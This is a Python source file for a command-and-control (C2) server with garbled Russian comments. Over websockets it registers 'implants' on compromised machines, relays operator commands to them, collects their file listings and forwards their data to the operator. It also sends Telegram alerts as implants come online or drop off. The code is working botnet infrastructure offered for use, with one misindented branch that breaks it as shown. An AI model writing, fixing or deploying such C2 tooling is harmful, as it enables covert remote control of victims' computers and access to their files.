#
# --- –§–∞–π–ª: c2_server.py (–í–µ—Ä—Å–∏—è 2.0.1 - –°—Ç–∞–±–∏–ª—å–Ω—ã–π —Ñ—É–Ω–¥–∞–º–µ–Ω—Ç) ---
# –¢–í–û–ô –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π, —Ä–∞–±–æ—á–∏–π —à–∞–±–ª–æ–Ω —Å –û–î–ù–ò–ú –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ–º:
# –¥–æ–±–∞–≤–ª–µ–Ω heartbeat –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏ –Ω–∞ Render.com.
#
import asyncio, json, os, threading, urllib.parse, urllib.request
from aiohttp import web
import settings

# –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –æ—Å—Ç–∞–µ—Ç—Å—è —Ç–≤–æ–µ–π, –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π
def send_telegram_message(message):
    def send():
        try:
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
            urllib.request.urlopen(url, timeout=10)
        except Exception as e:
            print(f"[!] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")
    threading.Thread(target=send, daemon=True).start()

IMPLANTS, OPERATOR = {}, None

async def websocket_handler(request):
    global OPERATOR, IMPLANTS

    # <<< –ï–î–ò–ù–°–¢–í–ï–ù–ù–û–ï –ò–ó–ú–ï–ù–ï–ù–ò–ï: –°–ï–†–î–ï–ß–ù–´–ô –†–ò–¢–ú >>>
    ws = web.WebSocketResponse(heartbeat=25.0)
    await ws.prepare(request)

    client_type, client_id = None, None
    try:
        # –¢–≤–æ—è –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        initial_msg = await ws.receive_json(timeout=30.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            print("[+] –û–ø–µ—Ä–∞—Ç–æ—Ä –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è.")
            await broadcast_bot_list()
        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            # –¢–≤–æ—è –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞ —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
            IMPLANTS[client_id] = {
                "ws": ws,
                "files": initial_msg.get('files', {}),
                "volume_state": initial_msg.get('volume_state', {"level": 50, "is_muted": False})
            }
            print(f"[+] –ù–æ–≤—ã–π –∏–º–ø–ª–∞–Ω—Ç –æ–Ω–ª–∞–π–Ω: {client_id}")
            send_telegram_message(f"‚úÖ –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù: {client_id}")
            await broadcast_bot_list()
        else:
            await ws.close()
            return ws

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'ping': await ws.send_str('pong'); continue
                data = json.loads(msg.data)
                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id]["ws"].send_json(data['payload'])
            elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        # –û—Ç–¥–∞–µ–º –¥–µ—Ç–∞–ª–∏ –∏–∑ —Ç–≤–æ–µ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã —Ö—Ä–∞–Ω–µ–Ω–∏—è
                        details = {
                            "files": IMPLANTS[target_id].get("files"),
                            "volume_state": IMPLANTS[target_id].get("volume_state")
                        }
                        await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})

            elif client_type == 'implant':
                    # –¢–≤–æ—è –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
                    if data.get('type') == 'file_list_update':
                        if client_id in IMPLANTS: IMPLANTS[client_id]["files"] = data.get('files', {})
                    elif data.get('type') == 'volume_update':
                        if client_id in IMPLANTS: IMPLANTS[client_id]["volume_state"] = data.get('data')

                    # –ü–µ—Ä–µ—Å—ã–ª–∞–µ–º –æ–ø–µ—Ä–∞—Ç–æ—Ä—É –≤ –ª—é–±–æ–º —Å–ª—É—á–∞–µ
                    data['bot_id'] = client_id
                    if OPERATOR: await OPERATOR.send_json(data)

    except asyncio.TimeoutError:
        print("[!] –¢–∞–π–º–∞—É—Ç –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è.")
    except Exception as e:
        print(f"[!] –û—à–∏–±–∫–∞ –≤ websocket_handler: {e}")
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            print(f"[-] –ò–º–ø–ª–∞–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: {client_id}")
            send_telegram_message(f"‚ùå –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø: {client_id}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print("[-] –û–ø–µ—Ä–∞—Ç–æ—Ä –æ—Ç–∫–ª—é—á–∏–ª—Å—è.")
    return ws

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ü–†–û–°–¢–û–ô —Å–ø–∏—Å–æ–∫, –∫–∞–∫ –≤ —Ç–≤–æ–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–º —à–∞–±–ª–æ–Ω–µ
        bot_ids = list(IMPLANTS.keys())
        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})

async def http_handler(request):
    return web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html'))

async def main():
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"====== C2 SERVER (V2.0.1) ONLINE –Ω–∞ –ø–æ—Ä—Ç—É {port} ======")
    send_telegram_message("üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤—Ä—É—á–Ω—É—é.")
    finally:
        send_telegram_message("üõë –°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
